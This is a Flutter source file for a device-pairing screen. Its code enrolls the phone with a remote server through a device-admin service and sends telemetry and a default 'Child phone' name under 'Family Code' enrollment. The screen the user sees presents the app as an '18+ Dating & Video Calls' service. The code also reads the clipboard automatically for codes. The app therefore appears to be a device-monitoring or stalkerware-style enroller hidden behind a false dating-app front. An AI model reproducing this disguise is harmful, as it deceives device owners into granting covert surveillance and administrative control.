import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

import '../config.dart';
import '../services/device_admin_service.dart';

class PairingScreen extends StatefulWidget {
  final VoidCallback onPaired;

  const PairingScreen({super.key, required this.onPaired});

  @override
  State<PairingScreen> createState() => _PairingScreenState();
}

class _PairingScreenState extends State<PairingScreen> {
  static const Color _honey = Color(0xFFF3E2C6);
  static const Color _mistyRose = Color(0xFFECB8A2);
  static const Color _mocha = Color(0xFFBEA493);
  static const Color _deepTan = Color(0xFF88471B);

  final TextEditingController _codeController = TextEditingController();

  bool _loading = false;
  bool _autoChecking = true;
  bool _receivedDeepLinkCode = false;
  String? _error;

  static final RegExp _codePattern =
      RegExp(r'^(?:[A-Z0-9]{6}|[A-Z0-9]{32})$');

  @override
  void initState() {
    super.initState();

    DeviceAdminService.setInstallPairingCodeHandler(
      _onInstallPairingCode,
    );

    _tryClipboardAndPair();
  }

  @override
  void dispose() {
    DeviceAdminService.setInstallPairingCodeHandler(null);
    _codeController.dispose();
    super.dispose();
  }

  void _onInstallPairingCode(String code) {
    final normalizedCode = code.trim().toUpperCase();

    if (!_codePattern.hasMatch(normalizedCode) || !mounted) return;

    setState(() {
      _receivedDeepLinkCode = true;
      _codeController.text = normalizedCode;
      _autoChecking = false;
      _error = null;
    });
  }

  Future<String?> _readClipboardCode() async {
    try {
      final data = await Clipboard.getData(Clipboard.kTextPlain);
      final text = (data?.text ?? '').trim().toUpperCase();

      if (_codePattern.hasMatch(text)) {
        return text;
      }
    } catch (_) {}

    return null;
  }

  Future<void> _tryClipboardAndPair() async {
    var code = await DeviceAdminService.getInstallPairingCode();

    if (code == null) {
      await Future.delayed(const Duration(milliseconds: 500));
      code = await _readClipboardCode();
    }

    if (!mounted) return;

    if (code != null && !_receivedDeepLinkCode) {
      _codeController.text = code;
    }

    setState(() {
      _autoChecking = false;
    });
  }

  Future<void> _paste() async {
    final code = await _readClipboardCode();

    if (!mounted) return;

    if (code != null) {
      setState(() {
        _codeController.text = code;
        _error = null;
      });
    } else {
      setState(() {
        _error = 'No valid Invite Code found in clipboard.';
      });
    }
  }

  Future<void> _pair() async {
    final code = _codeController.text.trim().toUpperCase();

    if (!_codePattern.hasMatch(code)) {
      setState(() {
        _error =
            'Enter a valid 6-character Pairing Code or 32-character Family Code.';
      });
      return;
    }

    setState(() {
      _loading = true;
      _error = null;
    });

    try {
      final isFamilyInvite = code.length == 32;

      final telemetry =
          await DeviceAdminService.getDeviceTelemetry();

      final deviceName = telemetry['device_name'] ??
          await DeviceAdminService.getDeviceName() ??
          'Child phone';

      final requestBody = isFamilyInvite
          ? {
              'family_invite': code,
              'installation_id': await _getInstallationId(),
              'device_name': deviceName,
              'manufacturer': telemetry['manufacturer'],
              'model': telemetry['model'],
              'android_version': telemetry['android_version'],
              'battery_level': telemetry['battery_level'],
            }
          : {
              'pairing_code': code,
            };

      final response = await http
          .post(
            Uri.parse(
              '${ApiConfig.baseUrl}/devices/${isFamilyInvite ? 'enroll-family' : 'pair'}',
            ),
            headers: {
              'Content-Type': 'application/json',
              'Accept': 'application/json',
            },
            body: jsonEncode(requestBody),
          )
          .timeout(const Duration(seconds: 20));

      final decoded = jsonDecode(response.body);

      if (decoded is! Map<String, dynamic>) {
        throw const FormatException('Unexpected pairing response.');
      }

      if (response.statusCode != 200) {
        if (!mounted) return;

        setState(() {
          _error = decoded['error']?.toString() ??
              decoded['message']?.toString() ??
              'Connection failed (${response.statusCode}).';
        });

        return;
      }

      final token = decoded['device_token']?.toString();

      if (token == null || token.isEmpty) {
        throw const FormatException(
          'Server response did not contain a device token.',
        );
      }

      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('device_token', token);

      if (!await DeviceAdminService.saveDeviceToken(token)) {
        throw PlatformException(
          code: 'DEVICE_TOKEN_SAVE_FAILED',
          message: 'Device token could not be saved.',
        );
      }

      if (!await DeviceAdminService.setPaired(true)) {
        throw PlatformException(
          code: 'PAIRING_STATE_SAVE_FAILED',
          message: 'Connection status could not be saved.',
        );
      }

      if (!mounted) return;

      widget.onPaired();
    } on TimeoutException {
      if (!mounted) return;

      setState(() {
        _error = 'Server response timed out. Please try again.';
      });
    } on SocketException {
      if (!mounted) return;

      setState(() {
        _error = 'No internet connection. Please try again.';
      });
    } on http.ClientException {
      if (!mounted) return;

      setState(() {
        _error = 'Unable to connect to the server.';
      });
    } on FormatException {
      if (!mounted) return;

      setState(() {
        _error = 'Unable to process the server response.';
      });
    } on PlatformException catch (error) {
      if (!mounted) return;

      setState(() {
        _error = error.message ?? 'Unable to save connection details.';
      });
    } catch (error) {
      if (!mounted) return;

      setState(() {
        _error = 'Connection failed: $error';
      });
    } finally {
      if (mounted) {
        setState(() {
          _loading = false;
        });
      }
    }
  }

  Future<String> _getInstallationId() async {
    final prefs = await SharedPreferences.getInstance();

    final existingId = prefs.getString('installation_id');

    if (existingId != null && existingId.isNotEmpty) {
      return existingId;
    }

    final bytes = List<int>.generate(
      16,
      (_) => Random.secure().nextInt(256),
    );

    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;

    final hex = bytes
        .map((byte) => byte.toRadixString(16).padLeft(2, '0'))
        .join();

    final installationId = [
      hex.substring(0, 8),
      hex.substring(8, 12),
      hex.substring(12, 16),
      hex.substring(16, 20),
      hex.substring(20),
    ].join('-');

    await prefs.setString('installation_id', installationId);

    return installationId;
  }

  @override
  Widget build(BuildContext context) {
    if (_autoChecking || (_loading && _error == null)) {
      return const Scaffold(
        backgroundColor: _honey,
        body: Center(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              CircularProgressIndicator(color: _deepTan),
              SizedBox(height: 18),
              Text(
                'Checking Your Connection...',
                style: TextStyle(color: _deepTan),
              ),
            ],
          ),
        ),
      );
    }

    final hasCode = _codeController.text.trim().isNotEmpty;

    return Scaffold(
      backgroundColor: _honey,
      appBar: AppBar(
        backgroundColor: _honey,
        foregroundColor: _deepTan,
        elevation: 0,
        title: const Text('18+ Dating & Video Calls'),
      ),
      body: SafeArea(
        child: ListView(
          padding: const EdgeInsets.fromLTRB(22, 12, 22, 28),
          children: [
            Center(
              child: Container(
                width: 92,
                height: 92,
                decoration: BoxDecoration(
                  color: _mistyRose,
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _mocha.withValues(alpha: 0.55),
                    width: 1.5,
                  ),
                ),
                child: const Icon(
                  Icons.favorite_rounded,
                  size: 52,
                  color: _deepTan,
                ),
              ),
            ),

            const SizedBox(height: 18),

            const Text(
              '18+ Dating & Live Connections',
              textAlign: TextAlign.center,
              style: TextStyle(
                color: _deepTan,
                fontSize: 26,
                fontWeight: FontWeight.w800,
              ),
            ),

            const SizedBox(height: 16),

            const Text(
              'Meet adults aged 18 and above who share your interests. '
              'Discover new connections, find your preferred partner, '
              'enjoy private video calls, and explore exciting dating experiences.',
              textAlign: TextAlign.center,
              style: TextStyle(
                fontSize: 15,
                height: 1.5,
                color: _deepTan,
              ),
            ),

            const SizedBox(height: 24),

            const Text(
              '18+ Invite / Connection Code',
              style: TextStyle(
                color: _deepTan,
                fontWeight: FontWeight.bold,
                fontSize: 15,
              ),
            ),

            const SizedBox(height: 9),

            TextField(
              controller: _codeController,
              enabled: !_loading,
              textCapitalization: TextCapitalization.characters,
              autocorrect: false,
              enableSuggestions: false,
              maxLength: 32,
              inputFormatters: [
                FilteringTextInputFormatter.allow(
                  RegExp(r'[a-zA-Z0-9]'),
                ),
                UpperCaseTextFormatter(),
              ],
              onChanged: (_) {
                setState(() {
                  _error = null;
                });
              },
              decoration: InputDecoration(
                hintText: 'Enter your 32-character Invite Code',
                counterText: '',
                hintStyle: TextStyle(
                  color: _mocha.withValues(alpha: 0.9),
                ),
                filled: true,
                fillColor: const Color(0xFFFFF9F1),
                contentPadding: const EdgeInsets.symmetric(
                  horizontal: 16,
                  vertical: 17,
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: BorderSide(
                    color: _mocha.withValues(alpha: 0.75),
                  ),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: const BorderSide(
                    color: _deepTan,
                    width: 2,
                  ),
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                ),
                suffixIconColor: _deepTan,
                errorBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: const BorderSide(color: _mistyRose),
                ),
                suffixIcon: IconButton(
                  onPressed: _loading ? null : _paste,
                  icon: const Icon(Icons.content_paste),
                  tooltip: 'Paste Invite Code',
                ),
              ),
            ),

            const SizedBox(height: 8),

            const Text(
              'Your Invite Code will appear automatically when you '
              'open the invitation link. If it does not appear, '
              'you can enter or paste the code here.',
              style: TextStyle(
                fontSize: 12,
                color: _deepTan,
                height: 1.4,
              ),
            ),

            if (_error != null) ...[
              const SizedBox(height: 14),
              Text(
                _error!,
                textAlign: TextAlign.center,
                style: const TextStyle(
                  color: _deepTan,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ],

            const SizedBox(height: 22),

            SizedBox(
              height: 54,
              child: FilledButton(
                onPressed: _loading || !hasCode ? null : _pair,
                style: FilledButton.styleFrom(
                  backgroundColor: _deepTan,
                  foregroundColor: _honey,
                  disabledBackgroundColor: _mocha.withValues(alpha: 0.55),
                  disabledForegroundColor: _deepTan.withValues(alpha: 0.7),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  elevation: 2,
                ),
                child: _loading
                    ? const CircularProgressIndicator(
                        color: _honey,
                      )
                    : const Text(
                        'Connect Device',
                        style: TextStyle(
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class UpperCaseTextFormatter extends TextInputFormatter {
  @override
  TextEditingValue formatEditUpdate(
    TextEditingValue oldValue,
    TextEditingValue newValue,
  ) {
    return newValue.copyWith(
      text: newValue.text.toUpperCase(),
      selection: newValue.selection,
    );
  }
}